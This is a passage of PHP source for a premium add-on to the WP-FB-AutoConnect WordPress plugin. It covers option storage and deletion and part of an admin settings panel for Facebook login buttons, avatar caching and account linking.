<?php
/*
 * WP-FB-AutoConnect Premium Add-On
 * http://www.justin-klein.com/projects/wp-fb-autoconnect
 * 
 * This file does not operate as a standalone plugin; it must be used in conjunction with WP-FB-AutoConnect,
 * which you can download for free from Wordpress.org.  To install the add-on, just upload this file 
 * (WP-FB-AutoConnect-Premium.php) to your Wordpress plugins directory and the options will be automatically 
 * added to your admin panel. 
 * 
 * Disclaimer:
 * The code below is owned exclusively by Justin Klein (justin@justin-klein.com)
 * You are permitted to modify the code below for personal use.
 * You are not permitted to share, sell, or in any way distribute any of the code below.
 * You are not permitted to share, sell, or in any way distribute any work derived from the code below,
 * including new plugins that may include similar functionality.
 * You are not permitted to instruct others on how to reproduce the behavior implemented below.
 * Basically, you can use this plugin however you like *on your own site*; just don't share it with anyone else :)
 *
 * Please see the bottom of this file for a complete version history.
 *   
 */
 

/**********************************************************************/
/**********************************************************************/
/*************************PREMIUM OPTIONS******************************/
/**********************************************************************/
/**********************************************************************/


//Identify the premium version as being present & available
define('JFB_PREMIUM', 4502);
define('JFB_PREMIUM_VER', 33);
define('JFB_PREMIUM_REQUIREDVER', '3.1.3');
if(!defined('WPINC')) { echo "WP-FB-AutoConnect Premium<br/>Version: ".JFB_PREMIUM_VER."<br/>Number: ".JFB_PREMIUM;exit;}

//Override plugin name
global $jfb_name, $jfb_version;
$jfb_name = "WP-FB AutoConnect Premium";

//Define new premium options
global $opt_jfbp_notifyusers, $opt_jfbp_notifyusers_content, $opt_jfbp_notifyusers_subject;
global $opt_jfbp_commentfrmlogin, $opt_jfbp_wploginfrmlogin, $opt_jfbp_registrationfrmlogin, $opt_jfbp_bpregistrationfrmlogin, $opt_jfbp_cache_avatars, $opt_jfbp_cache_avatars_fullsize, $opt_jfbp_cache_avatar_dir, $opt_jfbp_cachedir_changetoblog;
global $opt_jfbp_buttonstyle, $opt_jfbp_buttonsize, $opt_jfbp_buttontext, $opt_jfbp_buttonimg, $opt_jfbp_requirerealmail;
global $opt_jfbp_redirect_new, $opt_jfbp_redirect_new_custom, $opt_jfbp_redirect_existing, $opt_jfbp_redirect_existing_custom, $opt_jfbp_redirect_logout, $opt_jfbp_redirect_logout_custom;
global $opt_jfbp_restrict_reg, $opt_jfbp_restrict_reg_url, $opt_jfbp_restrict_reg_uid, $opt_jfbp_restrict_reg_pid, $opt_jfbp_restrict_reg_gid;
global $opt_jfbp_show_spinner, $opt_jfbp_allow_link, $opt_jfbp_allow_disassociate, $opt_jfbp_autoregistered_role;
global $opt_jfbp_wordbooker_integrate, $opt_jfbp_signupfrmlogin;
global $opt_jfbp_localize_facebook;
global $opt_jfbp_first_activation;
global $opt_jfbp_xprofile_map, $opt_jfbp_xprofile_mappings;
global $opt_jfbp_bpstream_login, $opt_jfbp_bpstream_logincontent;
global $opt_jfbp_bpstream_register, $opt_jfbp_bpstream_registercontent;
global $opt_jfbp_latestversion, $opt_jfbp_hide_updatenote_till_ver;
global $opt_jfbp_invalids;
$opt_jfbp_notifyusers = "jfb_p_notifyusers";
$opt_jfbp_notifyusers_subject = "jfb_p_notifyusers_subject";
$opt_jfbp_notifyusers_content = "jfb_p_notifyusers_content";
$opt_jfbp_commentfrmlogin = "jfb_p_commentformlogin";
$opt_jfbp_wploginfrmlogin = "jfb_p_wploginformlogin";
$opt_jfbp_registrationfrmlogin = "jfb_p_registrationformlogin";
$opt_jfbp_bpregistrationfrmlogin = "jfb_p_bpregistrationformlogin";
$opt_jfbp_cache_avatars = "jfb_p_cacheavatars";
$opt_jfbp_cache_avatars_fullsize = "jfb_p_cacheavatars_full";
$opt_jfbp_cache_avatar_dir = "jfb_p_cacheavatar_dir";
$opt_jfbp_cachedir_changetoblog = "jfb_p_cachedir_changetoblog";
$opt_jfbp_buttonstyle = "jfb_p_buttonstyle";
$opt_jfbp_buttonsize = "jfb_p_buttonsize";
$opt_jfbp_buttontext = "jfb_p_buttontext";
$opt_jfbp_buttonimg = "jfb_p_buttonimg";
$opt_jfbp_requirerealmail = "jfb_p_requirerealmail";
$opt_jfbp_redirect_new = 'jfb_p_redirect_new';
$opt_jfbp_redirect_new_custom = 'jfb_p_redirect_new_custom';
$opt_jfbp_redirect_existing = 'jfb_p_redirect_existing';
$opt_jfbp_redirect_existing_custom = 'jfb_p_redirect_new_existing';
$opt_jfbp_redirect_logout = 'jfb_p_redirect_logout';
$opt_jfbp_redirect_logout_custom = 'jfb_p_redirect_logout_custom';
$opt_jfbp_restrict_reg = 'jfb_p_restrict_reg';
$opt_jfbp_restrict_reg_url = 'jfb_p_restrict_reg_url';
$opt_jfbp_restrict_reg_uid = 'jfb_p_restrict_reg_uid';
$opt_jfbp_restrict_reg_pid = 'jfb_p_restrict_reg_pid';
$opt_jfbp_restrict_reg_gid = 'jfb_p_restrict_reg_gid';
$opt_jfbp_show_spinner = 'jfb_p_show_spinner';
$opt_jfbp_autoregistered_role = 'jfb_p_autoregistered_role';
$opt_jfbp_allow_link = 'jfb_p_allow_link';
$opt_jfbp_allow_disassociate = 'jfb_p_allow_disassociate';
$opt_jfbp_wordbooker_integrate = 'jfb_p_wordbooker_integrate';
$opt_jfbp_signupfrmlogin = 'jfb_p_signupformlogin';
$opt_jfbp_localize_facebook = 'jfb_p_localize_facebook';
$opt_jfbp_first_activation = 'jfb_p_first_activation';
$opt_jfbp_xprofile_map = "jfb_p_xprofile_map";
$opt_jfbp_xprofile_mappings = "jfb_p_xprofile_mappings";
$opt_jfbp_bpstream_login = "jfb_p_bpstream_login";
$opt_jfbp_bpstream_logincontent = "jfb_p_bpstream_logincontent";
$opt_jfbp_bpstream_register = "jfb_p_bpstream_register";
$opt_jfbp_bpstream_registercontent = "jfb_p_bpstream_registercontent";
$opt_jfbp_latestversion = 'jfb_p_latestversion';
$opt_jfbp_hide_updatenote_till_ver = 'jfb_p_hide_latestversion';
$opt_jfbp_invalids = "jfbp_invalids";

//A prefix to identify POSTed fields when updating the xprofile mappings option.
//This is not stored in the database, it's simply used to convert the separate POST vars into a single array (which IS stored as $opt_jfbp_xprofile_mappings).
global $jfb_xprofile_field_prefix;
$jfb_xprofile_field_prefix = "xfield_";


//Called when we save our options in the admin panel
function jfb_update_premium_opts()
{
    global $_POST, $jfb_name, $jfb_version;
    global $opt_jfbp_notifyusers, $opt_jfbp_notifyusers_content, $opt_jfbp_notifyusers_subject;
    global $opt_jfbp_commentfrmlogin, $opt_jfbp_wploginfrmlogin, $opt_jfbp_registrationfrmlogin, $opt_jfbp_bpregistrationfrmlogin, $opt_jfbp_cache_avatars, $opt_jfbp_cache_avatars_fullsize, $opt_jfbp_cache_avatar_dir, $opt_jfbp_cachedir_changetoblog;
    global $opt_jfbp_buttonstyle, $opt_jfbp_buttonsize, $opt_jfbp_buttontext, $opt_jfbp_buttonimg, $opt_jfbp_requirerealmail;
    global $opt_jfbp_redirect_new, $opt_jfbp_redirect_new_custom, $opt_jfbp_redirect_existing, $opt_jfbp_redirect_existing_custom, $opt_jfbp_redirect_logout, $opt_jfbp_redirect_logout_custom;
    global $opt_jfbp_restrict_reg, $opt_jfbp_restrict_reg_url, $opt_jfbp_restrict_reg_uid, $opt_jfbp_restrict_reg_pid, $opt_jfbp_restrict_reg_gid;
    global $opt_jfbp_show_spinner, $opt_jfbp_allow_link, $opt_jfbp_allow_disassociate, $opt_jfbp_autoregistered_role;
    global $opt_jfbp_wordbooker_integrate, $opt_jfbp_signupfrmlogin, $opt_jfbp_localize_facebook;
    global $opt_jfbp_xprofile_map, $opt_jfbp_xprofile_mappings, $jfb_xprofile_field_prefix;
	global $opt_jfbp_bpstream_login, $opt_jfbp_bpstream_logincontent, $opt_jfbp_bpstream_register, $opt_jfbp_bpstream_registercontent;
	
    update_option( $opt_jfbp_notifyusers,  isset( $_POST[$opt_jfbp_notifyusers] ) ? $_POST[$opt_jfbp_notifyusers] : 0 );
    update_option( $opt_jfbp_notifyusers_subject, stripslashes($_POST[$opt_jfbp_notifyusers_subject]) );
    update_option( $opt_jfbp_notifyusers_content, stripslashes($_POST[$opt_jfbp_notifyusers_content]) );
    update_option( $opt_jfbp_commentfrmlogin, isset( $_POST[$opt_jfbp_commentfrmlogin] ) ? $_POST[$opt_jfbp_commentfrmlogin] : 0 );
    update_option( $opt_jfbp_wploginfrmlogin, isset( $_POST[$opt_jfbp_wploginfrmlogin] ) ? $_POST[$opt_jfbp_wploginfrmlogin] : 0 );
    update_option( $opt_jfbp_registrationfrmlogin, isset( $_POST[$opt_jfbp_registrationfrmlogin] ) ? $_POST[$opt_jfbp_registrationfrmlogin] : 0 );
    update_option( $opt_jfbp_bpregistrationfrmlogin, isset( $_POST[$opt_jfbp_bpregistrationfrmlogin] ) ? $_POST[$opt_jfbp_bpregistrationfrmlogin] : 0 );
    update_option( $opt_jfbp_cache_avatars, isset( $_POST[$opt_jfbp_cache_avatars] ) ? $_POST[$opt_jfbp_cache_avatars] : 0 );
	update_option( $opt_jfbp_cache_avatars_fullsize, isset( $_POST[$opt_jfbp_cache_avatars_fullsize] ) ? $_POST[$opt_jfbp_cache_avatars_fullsize] : 0 );
    update_option( $opt_jfbp_cache_avatar_dir, $_POST[$opt_jfbp_cache_avatar_dir] );
    update_option( $opt_jfbp_cachedir_changetoblog, $_POST[$opt_jfbp_cachedir_changetoblog] );
    update_option( $opt_jfbp_buttonstyle, $_POST[$opt_jfbp_buttonstyle] );
    update_option( $opt_jfbp_buttonsize, $_POST[$opt_jfbp_buttonsize] );
    update_option( $opt_jfbp_buttontext, $_POST[$opt_jfbp_buttontext] );
    update_option( $opt_jfbp_buttonimg, $_POST[$opt_jfbp_buttonimg] );
    update_option( $opt_jfbp_redirect_new, $_POST[$opt_jfbp_redirect_new] );
    update_option( $opt_jfbp_redirect_new_custom, $_POST[$opt_jfbp_redirect_new_custom] );
    update_option( $opt_jfbp_redirect_existing, $_POST[$opt_jfbp_redirect_existing] );
    update_option( $opt_jfbp_redirect_existing_custom, $_POST[$opt_jfbp_redirect_existing_custom] );
    update_option( $opt_jfbp_redirect_logout, $_POST[$opt_jfbp_redirect_logout] );
    update_option( $opt_jfbp_redirect_logout_custom, $_POST[$opt_jfbp_redirect_logout_custom] );
    update_option( $opt_jfbp_restrict_reg, $_POST[$opt_jfbp_restrict_reg] );
    update_option( $opt_jfbp_restrict_reg_url, $_POST[$opt_jfbp_restrict_reg_url] );
    update_option( $opt_jfbp_restrict_reg_uid, $_POST[$opt_jfbp_restrict_reg_uid] );
    update_option( $opt_jfbp_restrict_reg_pid, $_POST[$opt_jfbp_restrict_reg_pid] );
    update_option( $opt_jfbp_restrict_reg_gid, $_POST[$opt_jfbp_restrict_reg_gid] );
    update_option( $opt_jfbp_show_spinner, $_POST[$opt_jfbp_show_spinner] );
	update_option( $opt_jfbp_allow_link, isset( $_POST[$opt_jfbp_allow_link] ) ? $_POST[$opt_jfbp_allow_link] : 0 );
	update_option( $opt_jfbp_allow_disassociate, isset( $_POST[$opt_jfbp_allow_disassociate] ) ? $_POST[$opt_jfbp_allow_disassociate] : 0 );
	update_option( $opt_jfbp_autoregistered_role, $_POST[$opt_jfbp_autoregistered_role] );
    update_option( $opt_jfbp_wordbooker_integrate, isset( $_POST[$opt_jfbp_wordbooker_integrate] ) ? $_POST[$opt_jfbp_wordbooker_integrate] : 0 );
    update_option( $opt_jfbp_signupfrmlogin, isset( $_POST[$opt_jfbp_signupfrmlogin] ) ? $_POST[$opt_jfbp_signupfrmlogin] : 0 );
    update_option( $opt_jfbp_localize_facebook, isset( $_POST[$opt_jfbp_localize_facebook] ) ? $_POST[$opt_jfbp_localize_facebook] : 0 );
    update_option( $opt_jfbp_requirerealmail, isset( $_POST[$opt_jfbp_requirerealmail] ) ? $_POST[$opt_jfbp_requirerealmail] : 0 );
    update_option( $opt_jfbp_xprofile_map, isset( $_POST[$opt_jfbp_xprofile_map] ) ? $_POST[$opt_jfbp_xprofile_map] : 0 );
	update_option( $opt_jfbp_bpstream_login, isset( $_POST[$opt_jfbp_bpstream_login] ) ? $_POST[$opt_jfbp_bpstream_login] : 0 );
	update_option( $opt_jfbp_bpstream_logincontent, $_POST[$opt_jfbp_bpstream_logincontent] );
	update_option( $opt_jfbp_bpstream_register, isset( $_POST[$opt_jfbp_bpstream_register] ) ? $_POST[$opt_jfbp_bpstream_register] : 0 );
	update_option( $opt_jfbp_bpstream_registercontent, $_POST[$opt_jfbp_bpstream_registercontent] );
    
    //The only option that needs special handling is the xprofile mappings array; its elements come in as
    //separate POST vars prefixed by $jfb_xprofile_field_prefix; here, I combine them into the array that actually gets stored to the DB.
    $xprofile_map = array();
    foreach($_POST as $key => $value)
    {
        if( strpos($key, $jfb_xprofile_field_prefix) === FALSE ) continue;
        $fieldID = substr($key, strlen($jfb_xprofile_field_prefix));
        $xprofile_map[$fieldID] = $value;
    }
    update_option($opt_jfbp_xprofile_mappings, $xprofile_map);
    do_action('wpfb_p_update_options');
    ?><div class="updated"><p><strong>Premium Options saved.</strong></p></div><?php    
}

//Called to delete our options from the admin panel
function jfb_delete_premium_opts()
{
    global $opt_jfbp_notifyusers, $opt_jfbp_notifyusers_content, $opt_jfbp_notifyusers_subject;
    global $opt_jfbp_commentfrmlogin, $opt_jfbp_wploginfrmlogin, $opt_jfbp_registrationfrmlogin, $opt_jfbp_bpregistrationfrmlogin, $opt_jfbp_cache_avatars, $opt_jfbp_cache_avatars_fullsize, $opt_jfbp_cache_avatar_dir, $opt_jfbp_cachedir_changetoblog;
    global $opt_jfbp_buttonstyle, $opt_jfbp_buttonsize, $opt_jfbp_buttontext, $opt_jfbp_buttonimg, $opt_jfbp_requirerealmail;
    global $opt_jfbp_redirect_new, $opt_jfbp_redirect_new_custom, $opt_jfbp_redirect_existing, $opt_jfbp_redirect_existing_custom, $opt_jfbp_redirect_logout, $opt_jfbp_redirect_logout_custom;
    global $opt_jfbp_restrict_reg, $opt_jfbp_restrict_reg_url, $opt_jfbp_restrict_reg_uid, $opt_jfbp_restrict_reg_pid, $opt_jfbp_restrict_reg_gid;
    global $opt_jfbp_show_spinner, $opt_jfbp_allow_link, $opt_jfbp_allow_disassociate, $opt_jfbp_autoregistered_role;
    global $opt_jfbp_wordbooker_integrate, $opt_jfbp_signupfrmlogin, $opt_jfbp_localize_facebook;
    global $opt_jfbp_first_activation;
    global $opt_jfbp_xprofile_map, $opt_jfbp_xprofile_mappings;
	global $opt_jfbp_bpstream_login, $opt_jfbp_bpstream_logincontent, $opt_jfbp_bpstream_register, $opt_jfbp_bpstream_registercontent;
	global $opt_jfbp_latestversion, $opt_jfbp_hide_updatenote_till_ver;
    delete_option($opt_jfbp_notifyusers);
    delete_option($opt_jfbp_notifyusers_subject);
    delete_option($opt_jfbp_notifyusers_content);
    delete_option($opt_jfbp_commentfrmlogin);
    delete_option($opt_jfbp_wploginfrmlogin);
    delete_option($opt_jfbp_registrationfrmlogin);
    delete_option($opt_jfbp_bpregistrationfrmlogin);
    delete_option($opt_jfbp_cache_avatars);
	delete_option($opt_jfbp_cache_avatars_fullsize);
    delete_option($opt_jfbp_cache_avatar_dir);
    delete_option($opt_jfbp_cachedir_changetoblog);
    delete_option($opt_jfbp_buttonstyle);
    delete_option($opt_jfbp_buttonsize);
    delete_option($opt_jfbp_buttontext);
    delete_option($opt_jfbp_buttonimg);
    delete_option($opt_jfbp_requirerealmail);
    delete_option($opt_jfbp_redirect_new);
    delete_option($opt_jfbp_redirect_new_custom);
    delete_option($opt_jfbp_redirect_existing);
    delete_option($opt_jfbp_redirect_existing_custom);
    delete_option($opt_jfbp_redirect_logout);
    delete_option($opt_jfbp_redirect_logout_custom);
    delete_option($opt_jfbp_restrict_reg);
    delete_option($opt_jfbp_restrict_reg_url);
    delete_option($opt_jfbp_restrict_reg_uid);
    delete_option($opt_jfbp_restrict_reg_pid);
    delete_option($opt_jfbp_restrict_reg_gid);
    delete_option($opt_jfbp_show_spinner);
    delete_option($opt_jfbp_allow_link);
	delete_option($opt_jfbp_allow_disassociate);
	delete_option($opt_jfbp_autoregistered_role);
    delete_option($opt_jfbp_wordbooker_integrate);
    delete_option($opt_jfbp_signupfrmlogin);
    delete_option($opt_jfbp_localize_facebook);
    delete_option($opt_jfbp_first_activation);
    delete_option($opt_jfbp_xprofile_map);
    delete_option($opt_jfbp_xprofile_mappings);
	delete_option($opt_jfbp_bpstream_login);
	delete_option($opt_jfbp_bpstream_logincontent);
	delete_option($opt_jfbp_bpstream_register);
	delete_option($opt_jfbp_bpstream_registercontent);
	delete_option($opt_jfbp_latestversion);
	delete_option($opt_jfbp_hide_updatenote_till_ver);
}


/**********************************************************************/
/**********************************************************************/
/**************************ADMIN PANEL*********************************/
/**********************************************************************/
/**********************************************************************/

function jfb_output_premium_panel()
{
    global $jfb_homepage;
    global $opt_jfbp_notifyusers, $opt_jfbp_notifyusers_subject, $opt_jfbp_notifyusers_content, $opt_jfbp_commentfrmlogin, $opt_jfbp_wploginfrmlogin, $opt_jfbp_registrationfrmlogin, $opt_jfbp_bpregistrationfrmlogin, $opt_jfbp_cache_avatars, $opt_jfbp_cache_avatars_fullsize, $opt_jfbp_cache_avatar_dir, $opt_jfbp_cachedir_changetoblog;
    global $opt_jfbp_buttonstyle, $opt_jfbp_buttonsize, $opt_jfbp_buttontext, $opt_jfbp_buttonimg, $opt_jfbp_requirerealmail;
    global $opt_jfbp_redirect_new, $opt_jfbp_redirect_new_custom, $opt_jfbp_redirect_existing, $opt_jfbp_redirect_existing_custom, $opt_jfbp_redirect_logout, $opt_jfbp_redirect_logout_custom;
    global $opt_jfbp_restrict_reg, $opt_jfbp_restrict_reg_url, $opt_jfbp_restrict_reg_uid, $opt_jfbp_restrict_reg_pid, $opt_jfbp_restrict_reg_gid;
    global $opt_jfbp_show_spinner, $opt_jfbp_allow_link, $opt_jfbp_allow_disassociate, $opt_jfbp_autoregistered_role, $jfb_data_url;
    global $opt_jfbp_wordbooker_integrate, $opt_jfbp_signupfrmlogin, $opt_jfbp_localize_facebook;
    global $opt_jfbp_xprofile_map, $opt_jfbp_xprofile_mappings, $jfb_xprofile_field_prefix;
	global $opt_jfbp_bpstream_login, $opt_jfbp_bpstream_logincontent, $opt_jfbp_bpstream_register, $opt_jfbp_bpstream_registercontent;
    function disableatt() { echo (defined('JFB_PREMIUM')?"":"disabled='disabled'"); }
    ?>
    <!--Show the Premium version number along with a link to immediately check for updates-->
    <form name="formPremUpdateCheck" method="post" action="">
        <h3>Premium Options <?php echo (defined('JFB_PREMIUM_VER')?"<span style='font-size:x-small;'>(<a href=\"javascript:document.formPremUpdateCheck.submit();\">Check for Updates</a>)</span>":""); ?></h3>
        <input type="hidden" name="VersionCheckNow" value="1" />
    </form>
    
    <?php 
    if( !defined('JFB_PREMIUM') )
        echo "<div class=\"jfb-admin_warning\"><i><b>The following options are available to Premium users only.</b><br />For information about the WP-FB-AutoConnect Premium Add-On, including purchasing instructions, please visit the plugin homepage <b><a href=\"$jfb_homepage#premium\">here</a></b></i>.</div>";
    ?>
    
    <form name="formPremOptions" method="post" action="">
    
        <b>MultiSite Support:</b><br/>
        <input disabled='disabled' type="checkbox" name="musupport" value="1" <?php echo ((defined('JFB_PREMIUM')&&function_exists('is_multisite')&&is_multisite())?"checked='checked'":"")?> >
        Automatically enabled when a MultiSite install is detected
        <?php jfb_output_simple_lightbox("(Click for more info)", "The free plugin is not aware of users registered on other sites in your WPMU installation, which can result in problems i.e. if someone tries to register on more than one site.  The Premium version will actively detect and handle existing users across all your sites.")?><br /><br />

        <b>Button Style:</b><br />
        <?php add_option($opt_jfbp_buttontext, "Login with Facebook");
        add_option($opt_jfbp_buttonsize, "2");
        $btnDefault = $jfb_data_url . "/assets/btn01.png";
        add_option($opt_jfbp_buttonimg, $btnDefault);
        $btnPreview = get_option($opt_jfbp_buttonimg);
        if(!$btnPreview) $btnPreview = $btnDefault;
        ?>

        <input <?php disableatt() ?> type="radio" style="float:left;" name="<?php echo $opt_jfbp_buttonstyle; ?>" value="0" <?php echo (get_option($opt_jfbp_buttonstyle)==0?"checked='checked'":"")?>>
        <div class="jfb-greybox" style="float:left;">
            <b>Original (xfbml):</b><br/>
            Text: <input <?php disableatt() ?> type="text" size="30" name="<?php echo $opt_jfbp_buttontext; ?>" value="<?php echo get_option($opt_jfbp_buttontext); ?>" /><br />
            Style: 
            <input <?php disableatt() ?> type="radio" name="<?php echo $opt_jfbp_buttonsize; ?>" value="2" <?php echo (get_option($opt_jfbp_buttonsize)==2?"checked='checked'":"")?>>Small
            <input <?php disableatt() ?> type="radio" name="<?php echo $opt_jfbp_buttonsize; ?>" value="3" <?php echo (get_option($opt_jfbp_buttonsize)==3?"checked='checked'":"")?>>Medium
            <input <?php disableatt() ?> type="radio" name="<?php echo $opt_jfbp_buttonsize; ?>" value="4" <?php echo (get_option($opt_jfbp_buttonsize)==4?"checked='checked'":"")?>>Large
            <input <?php disableatt() ?> type="radio" name="<?php echo $opt_jfbp_buttonsize; ?>" value="5" <?php echo (get_option($opt_jfbp_buttonsize)==5?"checked='checked'":"")?>>X-Large<br />
        </div><br clear="all"/>
        <input <?php disableatt() ?> type="radio" style="float:left;" name="<?php echo $opt_jfbp_buttonstyle; ?>" value="1" <?php echo (get_option($opt_jfbp_buttonstyle)==1?"checked='checked'":"")?>>
        <div class="jfb-greybox" style="float:left;">
            <b>Image (styleable):</b><br/>
            URL: <input <?php disableatt() ?> type="text" size="80" name="<?php echo $opt_jfbp_buttonimg; ?>" value="<?php echo get_option($opt_jfbp_buttonimg); ?>" /><br/>
            Preview: <img style="vertical-align:middle;margin-top:5px;" src="<?php echo $btnPreview?>" alt="(Login Button)" />
        </div><br clear="all"/><br/>
        
        <b>Additional Buttons:</b><br />
        <input <?php disableatt() ?> type="checkbox" name="<?php echo $opt_jfbp_commentfrmlogin?>" value="1" <?php echo get_option($opt_jfbp_commentfrmlogin)?'checked="checked"':''?> /> Add a Facebook Login button below the comment form<br />
        <input <?php disableatt() ?> type="checkbox" name="<?php echo $opt_jfbp_wploginfrmlogin?>" value="1" <?php echo get_option($opt_jfbp_wploginfrmlogin)?'checked="checked"':''?> /> Add a Facebook Login button to the standard Login page (wp-login.php)<br />
        <input <?php disableatt() ?> type="checkbox" name="<?php echo $opt_jfbp_registrationfrmlogin?>" value="1" <?php echo get_option($opt_jfbp_registrationfrmlogin)?'checked="checked"':''?> /> Add a Facebook Login button to the Registration page (wp-login.php)<br />
        <input <?php disableatt() ?> type="checkbox" name="<?php echo $opt_jfbp_bpregistrationfrmlogin?>" value="1" <?php echo get_option($opt_jfbp_bpregistrationfrmlogin)?'checked="checked"':''?> /> Add a Facebook Login button to the BuddyPress Registration page (/register)<br />
        <input <?php disableatt() ?> type="checkbox" name="<?php echo $opt_jfbp_signupfrmlogin?>" value="1" <?php echo get_option($opt_jfbp_signupfrmlogin)?'checked="checked"':''?> /> Add a Facebook Login button to the Signup page (wp-signup.php) (WPMU Only)<br /><br />
                		
		<!-- Facebook's OAuth 2.0 migration BROKE my ability to localize the XFBML-generated dialog.  I've reported a bug, and will do my best to fix it as soon as possible.
		 <b>Facebook Localization:</b><br />
		<?php add_option($opt_jfbp_localize_facebook, 1); ?>
		<input <?php disableatt() ?> type="checkbox" name="<?php echo $opt_jfbp_localize_facebook?>" value="1" <?php echo get_option($opt_jfbp_localize_facebook)?"checked='checked'":""?> >
		Translate Facebook prompts to the same locale as your Wordpress blog (Detected locale: <i><?php echo ( (defined('WPLANG')&&WPLANG!="") ? WPLANG : "en_US" ); ?></i>)
		<dfn title="The Wordpress locale is specified in wp-config.php, where valid language codes are of the form 'en_US', 'ja_JP', 'es_LA', etc.  Please see http://codex.wordpress.org/Installing_WordPress_in_Your_Language for more information on localizing Wordpress, and http://developers.facebook.com/docs/internationalization/ for a list of locales supported by Facebook.">(Mouseover for more info)</dfn><br /><br />
		 -->
						
        <b>Avatar Caching:</b><br />  
        <?php add_option($opt_jfbp_cache_avatars_fullsize, get_option($opt_jfbp_cache_avatars)); ?>       
        <input <?php disableatt() ?> type="checkbox" name="<?php echo $opt_jfbp_cache_avatars?>" value="1" <?php echo get_option($opt_jfbp_cache_avatars)?'checked="checked"':''?> />
        Cache Facebook avatars locally (thumbnail) <?php jfb_output_simple_lightbox("(Click for more info)", "This will make a local copy of Facebook avatars, so they'll always load reliably, even if Facebook's servers go offline or if a user deletes their photo from Facebook. They will be fetched and updated whenever a user logs in.");?><br />
        <input <?php disableatt() ?> type="checkbox" name="<?php echo $opt_jfbp_cache_avatars_fullsize?>" value="1" <?php echo get_option($opt_jfbp_cache_avatars_fullsize)?'checked="checked"':''?> />
        Cache Facebook avatars locally (fullsize) <?php jfb_output_simple_lightbox("(Click for more info)", "Because most themes only utilize thumbnail-sized avatars, caching full-sized images is often unnecessary.  If you're not actually using full-sized avatars I recommend disabling this option, as doing so will speed up logins and save space on your server (there's a small per-login performance cost to copying the files locally).")?><br />
        
        <?php add_option($opt_jfbp_cache_avatar_dir, 'facebook-avatars'); ?>
        Cache dir:
            <?php
            //If this is multisite, we'll allow the use of the uploaddir of *any* blog in the network (not just the current one).
            //This way, all the blogs can share the same avatar cache if desired.
            if(function_exists('is_multisite') && is_multisite())
            {
                global $wpdb;
                $blogs = $wpdb->get_results( $wpdb->prepare("SELECT blog_id, domain, path FROM $wpdb->blogs WHERE site_id = %d AND public = '1' AND archived = '0' AND mature = '0' AND spam = '0' AND deleted = '0' ORDER BY registered ASC", $wpdb->siteid), ARRAY_A );
                echo "<select name='".$opt_jfbp_cachedir_changetoblog."'>";
                foreach ($blogs AS $blog)
                {
                    switch_to_blog($blog['blog_id']);
                    $path = wp_upload_dir();
                    restore_current_blog();
                    $selectedBlogID = get_option($opt_jfbp_cachedir_changetoblog);
                    if($selectedBlogID == 0) $selectedBlogID = get_current_blog_id();
                    $selected = ($selectedBlogID == $blog['blog_id'])?" selected='true' ":'';
                    echo '<option '.$selected.' value="'.$blog['blog_id'].'">'.$path['basedir'].'</option>';
                }
                echo "</select>\\";
            }
            //If this is NOT multisite, we'll always use the current blog's upload_dir as the basedir for our avatar cache
            else
            {
                $path = wp_upload_dir();
                update_option($opt_jfbp_cachedir_changetoblog, 0);
                ?><span style="background-color:#FFFFFF; color:#aaaaaa; padding:2px 0;"><i><?php echo $path['basedir']; ?>/</i></span><?php
            }
            ?>
        <input <?php disableatt() ?> type="text" size="15" name="<?php echo $opt_jfbp_cache_avatar_dir; ?>" value="<?php echo get_option($opt_jfbp_cache_avatar_dir); ?>" />
        <?php jfb_output_simple_lightbox("(Click for more info)", "Changing the cache directory will not move existing avatars or update existing users; it only applies to subsequent logins.  It's therefore recommended that you choose a cache directory once, then leave it be.")?><br /><br />

        <b>Manual Linking &amp; Unlinking:</b><br />
        <input <?php disableatt() ?> type="checkbox" name="<?php echo $opt_jfbp_allow_link?>" value="1" <?php echo get_option($opt_jfbp_allow_link)?'checked="checked"':''?> /> Allow users to manually link their Wordpress/Buddypress accounts to Facebook
        <?php jfb_output_simple_lightbox("(Click for more info)", "This will add a button to each non-Facebook-connected user's Wordpress (and Buddypress) profile page, allowing them to manually link their blog account to their Facebook profile.  Although this plugin does try to match connecting Facebook users to existing Wordpress accounts by e-mail, this option provides a way for users to explicitly identify their local blog account - even if their e-mails don't match.")?><br />
        <input <?php disableatt() ?> type="checkbox" name="<?php echo $opt_jfbp_allow_disassociate?>" value="1" <?php echo get_option($opt_jfbp_allow_disassociate)?'checked="checked"':''?> /> Allow users to disassociate their Wordpress/Buddypress accounts from Facebook
        <?php jfb_output_simple_lightbox("(Click for more info)", "This will add a button to each connected user's Wordpress (and Buddypress) profile page, allowing them to disassociate their blog account from their Facebook profile.  User accounts which are not connected to Facebook will display 'Not Connected' in place of a button.")?><br />
        <input disabled='disabled' type="checkbox" name="admindisassociate" value="1" <?php echo (defined('JFB_PREMIUM')?"checked='checked'":"")?> /> Allow administrators to disassociate Wordpress/Buddypress user accounts from Facebook
        <?php jfb_output_simple_lightbox("(Click for more info)", "This option is always enabled for administrators.")?><br /><br />

        <b>Shortcode Support:</b><br />
        <input disabled='disabled' type="checkbox" name="shortcodesupport" value="1" <?php echo (defined('JFB_PREMIUM')?"checked='checked'":"")?> />
        Enable shortcode for rendering Facebook buttons to your posts and pages
        <?php jfb_output_simple_lightbox("(Click for more info)", "Shortcode support will allow you to manually place Facebook login buttons in your posts or pages, simply by inserting the tag <b>[jfb_facebook_btn]</b> in their content. The Facebook button will only be shown when nobody is logged into the site; otherwise, nothing is shown.  If you'd like to specify something to output for logged-in users, you can use the 'loggedin' parameter, like <b>[jfb_facebook_btn loggedin='Welcome!']</b>.<br/><br/>With the Premium addon installed, shortcode support is always enabled.  For general information on Wordpress shortcode, please see <a href='http://codex.wordpress.org/Shortcode' target='shortcode'>here</a>.")?><br /><br />
            
        <b>Double Logins:</b><br />
        <input disabled='disabled' type="checkbox" name="doublelogin" value="1" <?php echo (defined('JFB_PREMIUM')?"checked='checked'":"")?> />
        Automatically handle double logins 
        <?php jfb_output_simple_lightbox("(Click for more info)", "If a visitor opens two browser windows, logs into one, then logs into the other, the security nonce check will fail.  This is because in the second window, the current user no longer matches the user for which the nonce was generated.  The free version of the plugin reports this to the visitor, giving them a link to their desired redirect page.  The premium version will transparently handle such double-logins: to visitors, it'll look like the page has just been refreshed and they're now logged in.  For more information on nonces, please visit http://codex.wordpress.org/WordPress_Nonces.")?><br /><br />

        <b>E-Mail Permissions:</b><br />
        <input <?php disableatt() ?> type="checkbox" name="<?php echo $opt_jfbp_requirerealmail?>" value="1" <?php echo get_option($opt_jfbp_requirerealmail)?'checked="checked"':''?> /> Enforce access to user's real (unproxied) email
